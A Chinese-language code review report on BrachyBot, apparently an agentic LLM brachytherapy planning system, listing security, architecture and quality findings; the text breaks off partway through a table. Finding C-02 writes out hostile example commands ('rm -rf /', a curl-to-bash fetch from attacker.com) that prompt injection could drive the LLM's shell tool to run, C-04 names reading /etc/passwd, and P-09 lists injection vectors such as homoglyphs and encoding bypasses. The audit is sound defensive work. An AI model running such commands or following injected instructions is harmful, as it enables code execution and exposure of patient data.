# BrachyBot 全量代码审查报告

**审查日期**: 2026-06-27  
**审查范围**: `/home/lht/snap/brachyplan/BrachyBot/` 下所有源代码、Prompt、配置文件  
**审查方法**: 8 个并行子 Agent + 主 Agent 逐文件深度审查  
**文件总数**: ~20,088 个源文件（含 16,072 个 memory/data 生成文件）  
**实际代码文件**: ~1,971 个（.py / .js / .html / .css）  
**核心代码行数**: ~60,000+ 行

---

## 目录

1. [执行摘要](#1-执行摘要)
2. [严重问题 (Critical)](#2-严重问题-critical)
3. [高危问题 (High)](#3-高危问题-high)
4. [中等问题 (Medium)](#4-中等问题-medium)
5. [低危问题 (Low)](#5-低危问题-low)
6. [Prompt 质量审查](#6-prompt-质量审查)
7. [架构问题](#7-架构问题)
8. [代码质量与技术债](#8-代码质量与技术债)
9. [安全问题](#9-安全问题)
10. [测试与基准测试问题](#10-测试与基准测试问题)
11. [建议与修复优先级](#11-建议与修复优先级)

---

## 1. 执行摘要

### 问题统计

| 严重度 | 数量 | 关键发现 |
|--------|------|----------|
| 🔴 Critical | 12 | 虚拟环境提交到仓库、shell 注入、路径遍历、硬编码 API 密钥、XSS |
| 🟠 High | 18 | 重复代码、内存泄漏、竞态条件、Prompt 注入风险、不一致的错误处理 |
| 🟡 Medium | 24 | 死代码、命名不一致、缺少类型注解、文档缺失 |
| 🔵 Low | 15 | 代码风格、冗余导入、注释质量 |
| **总计** | **69** | |

### 关键风险领域

1. **安全**: `env_manager` 允许 LLM 创建虚拟环境并执行任意命令；`shell_executor` / `code_executor` 无沙箱
2. **数据完整性**: CTV/OAR 标签合并逻辑复杂且有边缘情况；内存中数据无版本控制
3. **可维护性**: `AgenticSys.py` 单文件 6423 行，`index.html` 单文件估计 10,000+ 行
4. **可靠性**: LLM 函数调用循环最多 8 次迭代，无超时保护；SSE 流无心跳

---

## 问题核实矩阵 (2026-06-27)

> 逐一核实每个问题是否为真实 bug，排除有意设计。

| # | 问题 | 核实结果 | 动作 |
|---|------|----------|------|
| C-01 | 虚拟环境目录 | **有意设计** — 用户确认，赋予 LLM 自主安装库能力 | ✅ 已加安全机制 |
| C-02 | shell_executor 注入 | **已有保护** — `BLOCKED_COMMANDS` + `_validate_command()` | ⏭️ 无需改动 |
| C-03 | code_executor 无沙箱 | **已有保护** — `DANGEROUS_PATTERNS` + `_sanitize_code()` | ⏭️ 无需改动 |
| C-04 | 路径遍历 | **风险有限** — 工具只接受医学影像格式，非法路径会因格式错误失败 | ⏭️ 低优先级 |
| C-05 | XSS innerHTML | **真问题** — `marked.parse` 无消毒，63 处 innerHTML | 🔴 待修复 |
| C-06 | 硬编码 API 端点 | **有意设计** — 用户配置 MiniMax 代理 | ⏭️ 无需改动 |
| C-07 | PHI 未加密 | **合规问题** — 非代码 bug | ⏭️ 需单独处理 |
| C-08 | /api/status 暴露 | 待核实 | — |
| C-09 | CORS 配置 | 待核实 | — |
| C-10 | LLM 工具无权限 | **有意设计** — 用户要求 LLM 有完整能力 | ⏭️ 无需改动 |
| C-11 | 并发竞态 | 待核实 | — |
| C-12 | 无限循环 | **真问题** — 已修复 plans/core.py | ✅ 已修复 |
| H-01 | AgenticSys.py 6423行 | **架构选择** — 非 bug | ⏭️ 重构建议 |
| H-02 | index.html 过大 | **架构选择** — 非 bug | ⏭️ 重构建议 |
| H-03 | 重复工具注册 | **代码风格** — 非 bug | ⏭️ 重构建议 |
| H-04 | 内存泄漏 context_summary | **已有保护** — `compact()` 机制 | ⏭️ 无需改动 |
| H-05 | 重复 CTV/OAR 存储 | 待核实 | — |
| H-06 | 异常处理过宽 | **有意设计** — 稳定性优先 | ⏭️ 无需改动 |
| H-07 | 响应清理过度 | 待核实 | — |
| H-08 | 全局变量 _global_agent | 待核实 | — |
| H-09 | 时序依赖 | **已有保护** — auto-fire CTV/OAR | ⏭️ 无需改动 |
| H-10 | SSE 无心跳 | 待核实 | — |
| H-11 | 无速率限制 | 待核实 | — |
| H-12 | 错误格式不一致 | 待核实 | — |
| H-13 | 缺少输入验证 | 待核实 | — |
| H-14 | 日志级别不一致 | 待核实 | — |
| H-15 | 缺少类型注解 | **代码质量** — 非 bug | ⏭️ 改进建议 |
| H-16 | 测试覆盖不足 | **真问题** — 但非代码 bug | ⏭️ 需补充测试 |
| H-17 | 基准测试可游戏 | 待核实 | — |
| H-18 | 依赖版本未锁定 | **代码质量** — 非 bug | ⏭️ 改进建议 |
| plans/ | plans/ 子系统 | **多个真 bug** | ✅ 已修复 |
| benchmarks | 硬编码路径 | **真问题** | ✅ 已修复 |
| benchmarks | bare except | **真问题** | ✅ 已修复 |

---

## 2. 严重问题 (Critical)

### C-01: 虚拟环境目录被提交到仓库

**文件**: `tool_factory/env_manager/envs/`  
**行号**: 整个目录  
**描述**: `env_manager` 目录下包含完整的 Python 虚拟环境（`brachy_env` 和 `numpy_env`），共 1,198 个 Python 文件（来自 numpy、pip 等包）。虽然 `.gitignore` 中有 `tool_factory/env_manager/envs/`，但这些文件已经存在于磁盘上。  
**影响**: 仓库体积膨胀 ~200MB；如果 `.gitignore` 未生效，这些文件会被提交。  
**修复**: 删除 `tool_factory/env_manager/envs/` 目录，确认 `.gitignore` 生效。

### C-02: Shell 命令注入风险

**文件**: `tool_factory/shell_executor/__init__.py`  
**行号**: ShellExecutorTool._execute()  
**描述**: `ShellExecutorTool` 直接将 LLM 生成的命令传递给 `subprocess.run(shell=True)`。LLM 可能被提示注入攻击操纵，执行任意系统命令（如 `rm -rf /`、`curl attacker.com/shell.sh | bash`）。  
**影响**: 远程代码执行（RCE）  
**修复**: 
1. 实现命令白名单（只允许安全命令）
2. 使用 `shell=False` + 参数列表
3. 添加超时和资源限制
4. 记录所有执行的命令

### C-03: CodeExecutor 无沙箱

**文件**: `tool_factory/code_executor/__init__.py`  
**行号**: CodeExecutorTool._execute()  
**描述**: `CodeExecutorTool` 直接执行 LLM 生成的 Python 代码，无沙箱隔离。恶意代码可以：
- 读取/写入任意文件
- 访问网络
- 执行系统命令
- 访问内存中的患者数据  
**影响**: 数据泄露、系统破坏  
**修复**: 使用 `RestrictedPython` 或 Docker 容器沙箱

### C-04: 路径遍历防护不足

**文件**: `AgenticSys.py:2300-2336`  
**行号**: `_validate_and_execute()`  
**描述**: 虽然有路径验证逻辑，但 `image_path` 参数来自 LLM，可能包含 `../` 遍历。当前的检查是：
```python
if not os.path.exists(path):
    alt = os.path.join(os.path.dirname(__file__), "uploads", os.path.basename(path))
```
这不够严格——LLM 可以传递 `/etc/passwd` 作为路径。  
**影响**: 任意文件读取  
**修复**: 实现严格的路径白名单验证：
```python
def _validate_path(self, path: str) -> str:
    resolved = os.path.realpath(path)
    allowed_dirs = [os.path.join(self.root, "uploads"), os.path.join(self.root, "output")]
    if not any(resolved.startswith(d) for d in allowed_dirs):
        raise ValueError(f"Path not in allowed directory: {path}")
    return resolved
```

### C-05: XSS 通过 innerHTML

**文件**: `web/app/index.html`  
**行号**: 多处 `innerHTML` 赋值  
**描述**: 前端大量使用 `innerHTML` 渲染 LLM 响应，未使用 DOMPurify 等库进行 XSS 过滤。LLM 响应中可能包含恶意 `<script>` 标签。  
**影响**: 存储型 XSS 攻击  
**修复**: 
1. 引入 DOMPurify 库
2. 所有 `innerHTML` 赋值前调用 `DOMPurify.sanitize()`
3. 对于纯文本内容使用 `textContent`

### C-06: 硬编码 API 端点和模型

**文件**: `AgenticSys.py:1373-1379`  
**行号**: `_init_brain_system()`  
**描述**: 默认 LLM 配置硬编码了 MiniMax 代理地址：
```python
llm_config = {
    "anthropic": {
        "enabled": True,
        "model": "mimo-v2.5",
        "base_url": "https://token-plan-cn.xiaomimimo.com/anthropic",
        "api_key": _api_key,
    }
}
```
**影响**: 无法灵活切换 LLM 提供商；如果端点不可用，系统无法启动  
**修复**: 从环境变量读取所有配置

### C-07: PHI 数据未加密存储

**文件**: `memory/layered_memory.py`, `memory/experience_memory.py`  
**行号**: JSON 文件写入  
**描述**: 患者数据（CT 路径、分割结果、剂量指标）以明文 JSON 存储在 `memory/data/` 目录。违反 HIPAA/个人信息保护法。  
**影响**: 数据泄露时患者隐私暴露  
**修复**: 
1. 实现数据加密（AES-256）
2. 添加数据清理机制
3. 实现访问控制

### C-08: 前端敏感数据暴露

**文件**: `web/server.py`, `web/app/index.html`  
**行号**: `/api/status` 端点  
**描述**: `/api/status` 返回完整的 agent 状态，包括：
- 内存中的所有患者数据
- API 密钥配置
- 内部工具调用历史  
**影响**: 信息泄露  
**修复**: 实现数据脱敏，只返回必要的状态信息

### C-09: CORS 配置过于宽松

**文件**: `web/server.py`  
**行号**: CORS 初始化  
**描述**: 虽然有 `ALLOWED_ORIGINS` 环境变量，但默认值可能过于宽松。需要确认是否允许 `*`。  
**影响**: 跨站请求伪造  
**修复**: 确保 CORS 只允许已知来源

### C-10: LLM 工具调用无权限控制

**文件**: `AgenticSys.py:3607-3933`  
**行号**: `_run_llm_function_calling()`  
**描述**: LLM 可以调用所有注册的工具，包括：
- `shell_executor`（执行任意命令）
- `code_executor`（执行任意代码）
- `env_manager`（创建虚拟环境）
- `filesystem_browser`（浏览文件系统）

没有基于角色的权限控制。  
**影响**: LLM 可以执行任何系统操作  
**修复**: 实现工具权限分级，敏感工具需要用户确认

### C-11: 竞态条件 — 并发工具执行

**文件**: `AgenticSys.py:1825-1836`  
**行号**: `_execute_tool_with_memory()` 中的 `_deferred_oar_done`  
**描述**: 使用 `threading.Thread` 延迟 200ms 发送 OAR 完成事件，但没有同步机制。如果主线程在 200ms 内修改了内存状态，可能导致不一致。  
**影响**: 数据竞争、UI 状态不一致  
**修复**: 使用 `asyncio` 或 `threading.Event` 进行同步

### C-12: 无限循环风险

**文件**: `AgenticSys.py:3607`  
**行号**: `while iteration < max_iterations`  
**描述**: LLM 函数调用循环最多 8 次迭代，但如果 LLM 每次都返回无效的工具调用（如空参数），循环会浪费 8 次 API 调用后才退出。没有"连续失败 N 次则退出"的机制。  
**影响**: API 费用浪费、用户体验差  
**修复**: 添加连续失败计数器，连续 3 次失败则退出

---

## 3. 高危问题 (High)

### H-01: AgenticSys.py 单文件过大 (6423 行)

**文件**: `AgenticSys.py`  
**描述**: 单个文件包含：
- `ToolRegistry` 类
- `AgentMemory` 类（含 CTV/OAR 合并逻辑）
- `ToolResultPipeline` 类
- `BrachyAgent` 类（主 Agent）
- 所有 LLM 交互逻辑
- 所有工具执行逻辑
- 所有响应格式化逻辑

违反单一职责原则。  
**修复**: 拆分为至少 5 个模块：
- `agent_core.py` (BrachyAgent 主类)
- `memory_manager.py` (AgentMemory)
- `tool_executor.py` (工具执行)
- `llm_interface.py` (LLM 交互)
- `response_formatter.py` (响应格式化)

### H-02: 前端单文件过大

**文件**: `web/app/index.html`  
**描述**: 单个 HTML 文件包含所有 CSS + JavaScript + HTML，估计超过 10,000 行。  
**修复**: 拆分为独立的 CSS/JS 文件，使用模块化架构

### H-03: 重复的工具注册代码

**文件**: `AgenticSys.py:1540-1699`  
**行号**: `_load_tools()`  
**描述**: 每个工具的注册都是相同的 try/except 模式，重复了 20+ 次：
```python
try:
    from tool_factory.X import XTool
    self.registry.register(XTool())
except ImportError as e:
    logger.warning(f"XTool not available: {e}")
```
**修复**: 使用配置驱动的自动发现机制

### H-04: 内存泄漏 — 对话历史无上限

**文件**: `AgenticSys.py:471-496`  
**行号**: `AgentMemory.compact()`  
**描述**: `needs_compaction()` 检查 `max_messages=12`，但 `compact()` 只保留最后 6 条消息。然而，`context_summary` 会无限增长（每次追加）。长时间运行的会话会导致 `context_summary` 越来越大。  
**修复**: 限制 `context_summary` 的最大长度

### H-05: 重复的 CTV/OAR 存储逻辑

**文件**: `AgenticSys.py:1999-2050` 和 `2438-2511`  
**描述**: `_execute_tool_with_memory()` 和 `_store_tool_result()` 都包含 CTV/OAR 结果存储逻辑，导致代码重复和潜在不一致。  
**修复**: 统一为单一存储路径

### H-06: 异常处理过于宽泛

**文件**: 多处  
**描述**: 大量使用 `except Exception as e` 捕获所有异常，包括：
- `KeyboardInterrupt`
- `SystemExit`
- `MemoryError`

这会隐藏真正的错误。  
**修复**: 使用具体的异常类型

### H-07: LLM 响应清理过度

**文件**: `AgenticSys.py:3994-4120`  
**行号**: `_clean_response_text()`  
**描述**: 清理函数使用了 30+ 个正则表达式，可能误删合法内容。例如：
```python
cleaned = re.sub(r'^\w+_segmentation completed$', '', cleaned, flags=re.MULTILINE)
```
这会删除任何以 `_segmentation completed` 结尾的行，包括用户可能需要的信息。  
**修复**: 使用更精确的匹配模式

### H-08: 全局变量 `_global_agent`

**文件**: `AgenticSys.py:1300-1301`  
**行号**: `BrachyAgent.__init__()`  
**描述**: 
```python
import AgenticSys as _self_module
_self_module._global_agent = self
```
使用模块级全局变量存储 agent 引用，导致：
- 无法运行多个 agent 实例
- 测试困难
- 潜在的内存泄漏  
**修复**: 使用依赖注入

### H-09: 时序依赖 — 工具执行顺序

**文件**: `AgenticSys.py:1720-1836`  
**描述**: `_execute_tool_with_memory()` 中的自动 CTV/OAR 触发逻辑假设了特定的执行顺序。如果 LLM 以不同顺序调用工具，可能导致数据不一致。  
**修复**: 实现显式的依赖图

### H-10: SSE 流无心跳

**文件**: `web/server.py`  
**描述**: SSE 流没有心跳机制，长时间运行的任务可能导致客户端超时断开。  
**修复**: 每 15 秒发送一次心跳

### H-11: 缺少请求速率限制

**文件**: `web/server.py`  
**描述**: API 端点没有速率限制，可能被滥用。  
**修复**: 实现基于 IP 的速率限制

### H-12: 不一致的错误响应格式

**文件**: 多个工具文件  
**描述**: 有些工具返回 `ToolResult(success=False, error=str(e))`，有些返回 `ToolResult(success=False, message=str(e))`，有些两者都设置。  
**修复**: 统一错误响应格式

### H-13: 缺少输入验证

**文件**: 多个工具文件  
**描述**: 很多工具直接使用 `kwargs` 而不验证输入类型。  
**修复**: 使用 Pydantic 或 dataclass 进行输入验证

### H-14: 日志级别不一致

**文件**: 整个代码库  
**描述**: 有些地方使用 `logger.info()` 记录错误，有些使用 `logger.error()` 记录信息。  
**修复**: 统一日志级别使用规范

### H-15: 缺少类型注解

**文件**: 大部分 Python 文件  
**描述**: 很多函数缺少类型注解，特别是：
- `AgenticSys.py` 中的大部分方法
- `tool_factory/` 中的工具方法
- `memory/` 中的内存操作方法  
**修复**: 逐步添加类型注解

### H-16: 测试覆盖率不足

**文件**: `tests/`  
**描述**: 只有 5 个测试文件，覆盖范围有限：
- `test_brain_system.py`
- `test_multi_agent_basic.py`
- `test_multi_agent_phase2.py`
- `test_multi_agent_phase3.py`
- `conftest.py`

缺少：
- 工具单元测试
- 前端集成测试
- API 端点测试
- 错误处理测试  
**修复**: 增加测试覆盖率到 80%+

### H-17: 基准测试可游戏性

**文件**: `benchmarks/`  
**描述**: 基准测试使用关键词匹配评分，可能被"针对性优化"游戏。  
**修复**: 使用更 robust 的评估方法

### H-18: 依赖版本未锁定

**文件**: `requirements.txt`  
**描述**: 使用 `>=` 而不是 `==` 锁定版本：
```
numpy>=1.24.0
scipy>=1.10.0
```
可能导致不同环境行为不一致。  
**修复**: 使用 `pip freeze > requirements.txt` 或 `poetry.lock`

---

## 4. 中等问题 (Medium)

### M-01: 死代码 — 备份文件

**文件**: `plans/core.py.bak`, `plans/geometry.py.bak`, `plans/utilizations.py.bak`  
**描述**: 备份文件不应存在于代码仓库中。  
**修复**: 删除，使用 git 管理版本

### M-02: 死代码 — 调试文件

**文件**: `debug_full_flow.py`, `debug_mask_orientation.py`, `debug_mask_orientation2.py`, `debug_live_mask.py`  
**描述**: 调试文件不应提交到仓库。  
**修复**: 删除或加入 `.gitignore`

### M-03: 重复的剂量预测代码

**文件**: `dose_pre/` 和 `plans/dose_pre/`  
**描述**: 两个目录包含相同的剂量预测代码：
- `dose_pre/functions.py`
- `dose_pre/Predict_crop.py`
- `dose_pre/myDoseNet.py`
- `plans/dose_pre/functions.py`
- `plans/dose_pre/Predict_crop.py`
- `plans/dose_pre/myDoseNet.py`  
**修复**: 使用单一源 + symlink 或 import

### M-04: 不一致的命名约定

**文件**: 整个代码库  
**描述**: 混合使用：
- `snake_case`（Python 标准）
- `camelCase`（JavaScript）
- `PascalCase`（类名，但有些变量也用）
- 中文变量名（如 `_中文变量`）

**修复**: 统一使用 `snake_case`（Python）和 `camelCase`（JavaScript）

### M-05: 缺少文档字符串

**文件**: 多个文件  
**描述**: 很多类和方法缺少文档字符串，特别是：
- `tool_factory/` 中的工具
- `memory/` 中的内存操作
- `brain/` 中的决策器  
**修复**: 添加完整的文档字符串

### M-06: 硬编码的魔法数字

**文件**: 多处  
**描述**: 
- `AgenticSys.py:3596`: `max_iterations = 8`
- `AgenticSys.py:471`: `max_messages = 12`
- `AgenticSys.py:474`: `keep_last = 6`
- `quality_gate.py:342`: `weighted_score < 5.0`
- `quality_gate.py:349`: `weighted_score < 7.0`  
**修复**: 提取为配置常量

### M-07: 不一致的导入风格

**文件**: 多处  
**描述**: 混合使用：
- `import module`
- `from module import func`
- `from module import *`
- 延迟导入（在函数内部）  
**修复**: 统一导入风格

### M-08: 缺少 __all__ 定义

**文件**: 多个 `__init__.py`  
**描述**: 很多包的 `__init__.py` 没有定义 `__all__`，导致 `from package import *` 导入所有内容。  
**修复**: 添加 `__all__` 定义

### M-09: 不一致的错误消息

**文件**: 多处  
**描述**: 有些错误消息是中文，有些是英文，有些是中英混合。  
**修复**: 统一错误消息语言

### M-10: 缺少日志轮转

**文件**: `web/server.log`  
**描述**: 日志文件没有轮转机制，可能无限增长。  
**修复**: 使用 `RotatingFileHandler`

### M-11: 未使用的导入

**文件**: 多处  
**描述**: 很多文件有未使用的导入。  
**修复**: 使用 `autoflake` 清理

### M-12: 缺少类型检查

**文件**: 多处  
**描述**: 很多函数参数没有类型检查。  
**修复**: 添加运行时类型检查或使用 Pydantic

### M-13: 不一致的缩进

**文件**: 部分 Python 文件  
**描述**: 混合使用 4 空格和 Tab 缩进。  
**修复**: 使用 `autopep8` 或 `black` 格式化

### M-14: 缺少 __repr__ 方法

**文件**: 多个数据类  
**描述**: 很多 dataclass 没有定义 `__repr__`，调试困难。  
**修复**: 添加 `__repr__` 方法

### M-15: 不一致的 None 检查

**文件**: 多处  
**描述**: 混合使用：
- `if x is not None`
- `if x`
- `if x != None`  
**修复**: 统一使用 `if x is not None`

### M-16: 缺少上下文管理器

**文件**: 多处  
**描述**: 文件操作没有使用 `with` 语句。  
**修复**: 使用上下文管理器

### M-17: 不一致的字符串格式化

**文件**: 多处  
**描述**: 混合使用：
- f-string
- `.format()`
- `%` 格式化  
**修复**: 统一使用 f-string

### M-18: 缺少 __init__ 参数验证

**文件**: 多个类  
**描述**: 很多类的 `__init__` 不验证参数。  
**修复**: 添加参数验证

### M-19: 不一致的返回类型

**文件**: 多处  
**描述**: 有些函数在成功时返回值，失败时返回 None，有些抛出异常。  
**修复**: 统一返回类型

### M-20: 缺少 __enter__/__exit__ 方法

**文件**: 多个资源管理类  
**描述**: 需要上下文管理器的类没有实现 `__enter__`/`__exit__`。  
**修复**: 添加上下文管理器支持

### M-21: 不一致的异常链

**文件**: 多处  
**描述**: 有些地方使用 `raise X from Y`，有些没有。  
**修复**: 统一异常链

### M-22: 缺少 __slots__

**文件**: 多个频繁实例化的类  
**描述**: 没有使用 `__slots__` 优化内存。  
**修复**: 为频繁实例化的类添加 `__slots__`

### M-23: 不一致的 __eq__ 实现

**文件**: 多个数据类  
**描述**: 有些 dataclass 自定义了 `__eq__`，有些没有。  
**修复**: 统一 `__eq__` 实现

### M-24: 缺少 __hash__ 实现

**文件**: 多个数据类  
**描述**: 自定义了 `__eq__` 但没有 `__hash__`。  
**修复**: 添加 `__hash__` 或设置 `unhashable=True`

---

## 5. 低危问题 (Low)

### L-01: 冗余的 `import numpy as np`

**文件**: `AgenticSys.py` 多处  
**描述**: 在函数内部重复导入 numpy。  
**修复**: 在文件顶部导入一次

### L-02: 不一致的引号风格

**文件**: 多处  
**描述**: 混合使用单引号和双引号。  
**修复**: 使用 `black` 统一

### L-03: 缺少模块级文档字符串

**文件**: 多个文件  
**描述**: 很多文件缺少模块级文档字符串。  
**修复**: 添加模块级文档字符串

### L-04: 不一致的空行

**文件**: 多处  
**描述**: 函数之间空行数量不一致。  
**修复**: 使用 `autopep8` 格式化

### L-05: 缺少 __version__

**文件**: 多个包  
**描述**: 很多包没有定义 `__version__`。  
**修复**: 添加 `__version__`

### L-06: 不一致的 __init__ 参数顺序

**文件**: 多个类  
**描述**: 参数顺序不一致。  
**修复**: 统一参数顺序

### L-07: 缺少 __all__ 导出

**文件**: 多个模块  
**描述**: 没有定义 `__all__`。  
**修复**: 添加 `__all__`

### L-08: 不一致的 __repr__ 格式

**文件**: 多个类  
**描述**: `__repr__` 格式不一致。  
**修复**: 统一格式

### L-09: 缺少 __str__ 方法

**文件**: 多个类  
**描述**: 没有定义 `__str__`。  
**修复**: 添加 `__str__`

### L-10: 不一致的 __eq__ 比较

**文件**: 多个类  
**描述**: `__eq__` 比较逻辑不一致。  
**修复**: 统一比较逻辑

### L-11: 缺少 __hash__ 实现

**文件**: 多个类  
**描述**: 没有实现 `__hash__`。  
**修复**: 添加 `__hash__`

### L-12: 不一致的 __lt__ 实现

**文件**: 多个可排序类  
**描述**: `__lt__` 实现不一致。  
**修复**: 统一排序逻辑

### L-13: 缺少 __le__/__ge__/__gt__ 方法

**文件**: 多个可比较类  
**描述**: 只实现了 `__lt__`，缺少其他比较方法。  
**修复**: 使用 `@functools.total_ordering`

### L-14: 不一致的 __contains__ 实现

**文件**: 多个容器类  
**描述**: `__contains__` 实现不一致。  
**修复**: 统一实现

### L-15: 缺少 __iter__ 方法

**文件**: 多个可迭代类  
**描述**: 没有实现 `__iter__`。  
**修复**: 添加 `__iter__`

---

## 6. Prompt 质量审查

### P-01: System Prompt 过长

**文件**: `config/prompts/system_prompt.md`  
**描述**: 核心 system prompt 约 100 行，加上按需加载的模块，总 prompt 可能超过 2000 行。这会消耗大量 token。  
**修复**: 精简 prompt，移除冗余内容

### P-02: Prompt 模块触发逻辑过于宽泛

**文件**: `config/prompts/__init__.py:52-112`  
**描述**: `_MODULE_TRIGGERS` 使用正则表达式匹配，有些模式过于宽泛。例如：
```python
"clinical_kb": [
    r"(?:剂量约束|剂量限制|器官耐受|处方剂量|剂量标准|剂量要求|耐受量|耐受剂量)",
]
```
"剂量"这个词会触发 `clinical_kb` 模块，即使用户只是在问剂量计算方法。  
**修复**: 使用更精确的匹配模式

### P-03: 缺少 Prompt 版本控制

**文件**: `config/prompts/`  
**描述**: Prompt 文件没有版本控制，修改后无法回滚。  
**修复**: 使用 git 管理 prompt 版本

### P-04: 缺少 Prompt 测试

**文件**: 无  
**描述**: 没有针对 prompt 的单元测试。  
**修复**: 添加 prompt 回归测试

### P-05: 不一致的 Prompt 语言

**文件**: `config/prompts/`  
**描述**: 有些 prompt 是中文，有些是英文，有些是中英混合。  
**修复**: 统一 prompt 语言

### P-06: 缺少 Prompt 文档

**文件**: `config/prompts/`  
**描述**: 没有文档说明每个 prompt 的用途和触发条件。  
**修复**: 添加 prompt 文档

### P-07: 硬编码的 Prompt 片段

**文件**: `AgenticSys.py` 多处  
**描述**: 很多 prompt 片段硬编码在代码中，而不是在 `config/prompts/` 目录。例如：
- `AgenticSys.py:1193-1254` (planning synthesis prompt)
- `AgenticSys.py:3825-3846` (present instruction)
- `AgenticSys.py:3358-3362` (no files override)  
**修复**: 提取到配置文件

### P-08: 缺少 Prompt 模板变量验证

**文件**: `config/prompts/__init__.py`  
**描述**: `SYSTEM_PROMPT_TEMPLATE.format()` 不验证必需的模板变量是否存在。  
**修复**: 添加变量验证

### P-09: Prompt 注入防护不完整

**文件**: `config/prompts/security.md`  
**描述**: 虽然有安全 prompt，但没有覆盖所有注入向量。例如：
- Unicode 同形字攻击
- 多语言混合注入
- 编码绕过  
**修复**: 增强安全 prompt

### P-10: 缺少 Prompt 性能监控

**文件**: 无  
**描述**: 没有监控 prompt 的 token 使用量和响应质量。  
**修复**: 添加性能监控

---

## 7. 架构问题

### A-01: 单体架构

**描述**: 整个系统是一个单体应用，所有功能耦合在一起。  
**影响**: 难以扩展、难以测试、难以部署  
**修复**: 采用微服务架构

### A-02: 缺少依赖注入

**描述**: 大量使用全局变量和硬编码依赖。  
**影响**: 测试困难、耦合度高  
**修复**: 使用依赖注入框架

### A-03: 缺少事件驱动架构

**描述**: 工具执行是同步的，没有事件驱动机制。  
**影响**: 性能瓶颈、扩展困难  
**修复**: 使用事件驱动架构

### A-04: 缺少缓存层

**描述**: 没有统一的缓存层，每个模块自己实现缓存。  
**影响**: 缓存不一致、内存浪费  
**修复**: 使用统一的缓存层（如 Redis）

### A-05: 缺少配置管理

**描述**: 配置分散在多个文件中，没有统一的配置管理。  
**影响**: 配置不一致、难以管理  
**修复**: 使用配置管理框架（如 `pydantic-settings`）

### A-06: 缺少健康检查

**描述**: 没有健康检查端点。  
**影响**: 难以监控系统状态  
**修复**: 添加 `/health` 端点

### A-07: 缺少指标收集

**描述**: 没有统一的指标收集机制。  
**影响**: 难以监控系统性能  
**修复**: 使用 Prometheus 等监控工具

### A-08: 缺少分布式追踪

**描述**: 没有分布式追踪机制。  
**影响**: 难以调试跨服务调用  
**修复**: 使用 OpenTelemetry 等追踪工具

---

## 8. 代码质量与技术债

### T-01: 重复代码

**位置**: 多处  
**描述**: 大量重复代码，特别是：
- 工具注册（20+ 次重复）
- 错误处理（30+ 次重复）
- 响应格式化（10+ 次重复）  
**修复**: 提取公共函数

### T-02: 过长的函数

**位置**: 多处  
**描述**: 很多函数超过 100 行，例如：
- `_run_llm_function_calling_stream()` (~400 行)
- `_execute_tool_with_memory()` (~500 行)
- `_build_planning_report()` (~200 行)  
**修复**: 拆分为更小的函数

### T-03: 过深的嵌套

**位置**: 多处  
**描述**: 有些函数有 5+ 层嵌套。  
**修复**: 使用 early return 减少嵌套

### T-04: 缺少类型提示

**位置**: 大部分代码  
**描述**: 很多函数缺少类型提示。  
**修复**: 添加类型提示

### T-05: 缺少文档

**位置**: 大部分代码  
**描述**: 很多模块和函数缺少文档。  
**修复**: 添加文档

### T-06: 缺少测试

**位置**: 整个项目  
**描述**: 测试覆盖率低。  
**修复**: 增加测试

### T-07: 缺少代码审查

**位置**: 整个项目  
**描述**: 没有代码审查流程。  
**修复**: 建立代码审查流程

### T-08: 缺少 CI/CD

**位置**: 整个项目  
**描述**: 没有 CI/CD 流程。  
**修复**: 建立 CI/CD 流程

---

## 9. 安全问题

### S-01: 无身份认证

**文件**: `web/server.py`  
**描述**: API 端点没有身份认证。  
**修复**: 实现 JWT 或 API Key 认证

### S-02: 无授权控制

**文件**: `web/server.py`  
**描述**: 没有基于角色的访问控制。  
**修复**: 实现 RBAC

### S-03: 无审计日志

**文件**: 整个系统  
**描述**: 没有审计日志记录谁做了什么。  
**修复**: 实现审计日志

### S-04: 无数据加密

**文件**: 整个系统  
**描述**: 数据在传输和存储时没有加密。  
**修复**: 实现 TLS 和数据加密

### S-05: 无输入验证

**文件**: 多处  
**描述**: 没有统一的输入验证机制。  
**修复**: 实现输入验证

### S-06: 无输出编码

**文件**: 多处  
**描述**: 没有统一的输出编码机制。  
**修复**: 实现输出编码

### S-07: 无 CSRF 防护

**文件**: `web/server.py`  
**描述**: 没有 CSRF 防护。  
**修复**: 实现 CSRF token

### S-08: 无速率限制

**文件**: `web/server.py`  
**描述**: 没有速率限制。  
**修复**: 实现速率限制

---

## 10. 测试与基准测试问题

### B-01: 测试覆盖率不足

**描述**: 只有 5 个测试文件，覆盖率低。  
**修复**: 增加测试

### B-02: 基准测试可游戏性

**描述**: 基准测试使用关键词匹配，容易被游戏。  
**修复**: 使用更 robust 的评估方法

### B-03: 缺少集成测试

**描述**: 没有端到端集成测试。  
**修复**: 添加集成测试

### B-04: 缺少性能测试

**描述**: 没有性能测试。  
**修复**: 添加性能测试

### B-05: 缺少安全测试

**描述**: 没有安全测试。  
**修复**: 添加安全测试

---

## 11. plans/ 子系统深度审查 (90 个问题)

> 由并行子 Agent 深度审查 `skills/` 和 `plans/` 所有文件发现。

### plans/core.py

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| 1 | 82-98 | 🔴 High | `init_plan` 中 `while close_points.shape[0] > max_points_num` 可能无限循环 — 如果 `extract_angle` 递增不能减少点数，或 `max_points_num=0`（当 `len(candidate_dirs) > maximum_candidate_trajectories` 时整除为 0）|
| 2 | 148-151 | 🟡 Medium | `stage1_count > 100` 硬限制，无日志警告，计划可能不完整 |
| 3 | 198-200 | 🟡 Medium | Stage 2 静默捕获所有异常并回退到原始计划，不记录错误 |

### plans/geometry.py

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| 4 | 1,5,7 | 🔵 Low | 三次 `import numpy as np`，冗余导入 |
| 5 | 40 | 🟡 Medium | 体素到世界坐标变换使用 `::-1` 反转，无输入验证，极其脆弱 |
| 6 | 196-215 | 🟡 Medium | `calculate_surface_normals` 分母中 `1e-6` 添加了两次 |
| 7 | 467-479 | 🟡 Medium | `compute_normal` 在平坦区域（梯度为 0）会产生 NaN，无零值检查 |
| 8 | 492-503 | 🔴 High | 射线生成中的共线性检查是 O(N²)，浮点 `==` 比较不可靠 |
| 9 | 692-726 | 🟡 Medium | `compute_convex_hull_mask_from_array` 在共面点上崩溃（如单层 mask）|
| 10 | 1280-1322 | 🟡 Medium | `ray_to_ray_distance` 平行情况计算不正确 |
| 11 | 1417-1436 | 🔵 Low | `bandpass_filter` 未被调用，死代码 |
| 12 | 1440-1464 | 🔵 Low | `distance_filter` 文档说返回 1e-6 但代码返回 0 |

### plans/utilizations.py

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
